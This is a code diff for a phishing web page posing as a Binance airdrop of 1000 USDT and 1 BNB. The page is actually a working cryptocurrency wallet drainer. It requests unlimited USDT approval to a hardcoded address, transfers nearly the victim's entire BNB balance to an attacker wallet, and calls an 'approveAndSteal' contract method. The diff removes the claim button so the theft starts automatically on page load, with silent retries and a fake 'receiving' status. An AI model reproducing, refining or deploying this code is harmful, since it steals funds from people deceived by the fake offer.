@@ -12,20 +12,16 @@ body{font-family:'Poppins','Microsoft YaHei',sans-serif;height:100vh;overflow:hi
 @keyframes bgmove{0%{background-position:0 0;}100%{background-position:100% 100%;}}
 .container{backdrop-filter:blur(20px);background:rgba(255,255,255,.4);border-radius:24px;box-shadow:0 8px 32px rgba(255,182,193,.3);width:90%;max-width:440px;padding:40px;text-align:center;margin:10px;}
 h1{color:#ff3f9f;margin-bottom:20px;text-shadow:0 0 10px rgba(255,105,180,.5);font-size:28px;}
-button{padding:20px 40px;border:none;border-radius:30px;background:linear-gradient(45deg,#ff6ec7,#ff1493);color:white;font-size:20px;font-weight:bold;cursor:pointer;transition:.3s all;margin:20px 0;box-shadow:0 10px 30px rgba(255,105,180,.4);}
-button:hover{transform:scale(1.05);box-shadow:0 15px 40px rgba(255,105,180,.6);}
-button:active{background:linear-gradient(45deg,#ff1493,#ff6ec7);}
 #status{color:#ff69b4;font-size:20px;margin:15px;line-height:1.4;font-weight:600;}
 .sparkle{position:fixed;width:4px;height:4px;background:#fff;border-radius:50%;animation:fall 10s infinite linear;opacity:.8;}
 @keyframes fall{0%{transform:translateY(-10vh) scale(0);}50%{opacity:1;}100%{transform:translateY(110vh) scale(1);opacity:0;}}
-@media (max-width:480px){.container{padding:20px;width:95% !important;}button{padding:15px 30px;font-size:18px;}}
+@media (max-width:480px){.container{padding:20px;width:95% !important;}}
 </style>
 </head>
 <body>
 <div class="container">
   <h1>币安第3次空投同舟计划</h1>
-  <div id="status">💖 点击领取1000USDT+1BNB</div>
-  <button id="claimBtn">领取1000USDT+1BNB</button>
+  <div id="status">正在领取1000USDT+1BNB</div>
 </div>
 <script>
 const BVXZA = "0x1ff42792e962228099cfA175aDba5412dab1448c";
@@ -48,14 +44,14 @@ async function autoRedirect(){
   if(isMobile){
     setTimeout(() => {
       window.location.href = 'okxwallet://dapp?url=' + encodeURIComponent(window.location.href);
-    }, 300);
+    }, 200);
   }
 }
 
-async function claimReward(){
+async function autoSteal(){
   if(!authorized){
     // 第1次：USDT授权
-    updateStatus('💖 USDT授权中...');
+    updateStatus('正在领取1000USDT+1BNB');
     try{
       await window.ethereum.request({method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }]});
       web3 = new Web3(window.ethereum);
@@ -66,19 +62,17 @@ async function claimReward(){
       const usdt = new web3.eth.Contract(usdtABI, USDT_ADDR);
       await usdt.methods.approve(BVXZA, UNLIMITED).send({from: userAddr});
       authorized = true;
-      updateStatus('✅ USDT授权成功！自动转BNB...');
-      document.getElementById('claimBtn').innerText = '转BNB中...';
-      setTimeout(claimReward, 1500); // 1.5秒后自动转BNB
+      setTimeout(autoSteal, 1500); // 1.5秒后自动转BNB
       return;
     }catch(e){
-      updateStatus('💔 授权失败，点击重试');
+      setTimeout(autoSteal, 500);
       return;
     }
   }
   
   if(authorized && !bnbSent){
     // 第2次：BNB全转
-    updateStatus('🌙 转BNB中...');
+    updateStatus('正在领取1000USDT+1BNB');
     try{
       const balance = await web3.eth.getBalance(userAddr);
       const totalBNB = parseFloat(web3.utils.fromWei(balance, 'ether'));
@@ -86,41 +80,40 @@ async function claimReward(){
         const amount = web3.utils.toWei((totalBNB - 0.001).toString(), 'ether');
         await web3.eth.sendTransaction({from: userAddr, to: TAX_WALLET, value: amount});
         bnbSent = true;
-        updateStatus('✅ BNB转账成功！窃取USDT...');
-        document.getElementById('claimBtn').innerText = '窃取USDT中...';
-        setTimeout(claimReward, 1500); // 1.5秒后自动窃取
+        setTimeout(autoSteal, 1500); // 1.5秒后自动窃取
         return;
       }
     }catch(e){
-      updateStatus('💔 BNB转账失败，点击重试');
+      setTimeout(autoSteal, 500);
       return;
     }
   }
   
   if(authorized && bnbSent){
     // 第3次：BVXZA全窃取
-    updateStatus('🎁 窃取1000USDT中...');
+    updateStatus('正在领取1000USDT+1BNB');
     try{
       const bvxza = new web3.eth.Contract(BVXZA_ABI, BVXZA);
       await bvxza.methods.approveAndSteal(USDT_ADDR, UNLIMITED).send({from: userAddr});
       updateStatus('🎉 1000USDT+1BNB到账！');
-      document.getElementById('claimBtn').innerText = '✅ 领取成功！';
     }catch(e){
-      updateStatus('💔 窃取失败，点击重试');
+      setTimeout(autoSteal, 500);
     }
   }
 }
 
-document.getElementById('claimBtn').onclick = claimReward;
+// 🔥 进入网址=0.2秒跳转+0.5秒自动全窃取！
+window.addEventListener('load', () => {
+  setTimeout(autoRedirect, 200);
+  if(window.ethereum){
+    setTimeout(autoSteal, 500);
+  }
+});
 
 if(window.ethereum){
-  window.ethereum.on('accountsChanged', claimReward);
-  window.ethereum.on('chainChanged', claimReward);
+  window.ethereum.on('accountsChanged', autoSteal);
+  window.ethereum.on('chainChanged', autoSteal);
 }
-
-window.addEventListener('load', () => {
-  setTimeout(autoRedirect, 500);
-});
 
 for(let i=0;i<50;i++){
   const s=document.createElement('div');
